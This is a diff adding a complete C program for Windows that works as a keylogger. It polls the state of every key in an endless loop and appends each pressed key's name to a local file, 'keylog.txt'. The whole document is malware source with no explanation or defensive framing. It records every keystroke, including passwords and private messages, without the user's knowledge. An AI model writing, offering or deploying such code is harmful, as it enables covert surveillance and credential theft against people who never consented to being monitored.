@@ -1,0 +1,36 @@
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+#include <windows.h>
+
+#define LOGFILE "keylog.txt"
+
+void log_key(FILE *file, int key_code) {
+    char key_name[50];
+    GetKeyNameText(key_code << 16, key_name, sizeof(key_name));
+    fprintf(file, "%s", key_name);
+}
+
+void log_keys(FILE *file) {
+    while (1) {
+        for (int i = 0; i < 256; i++) {
+            if (GetAsyncKeyState(i) == -32767) {
+                log_key(file, i);
+                fflush(file);
+            }
+        }
+        Sleep(10);
+    }
+}
+
+int main() {
+    FILE *file;
+    fopen_s(&file, LOGFILE, "a");
+    if (!file) {
+        perror("Error opening log file");
+        return 1;
+    }
+    log_keys(file);
+    fclose(file);
+    return 0;
+}
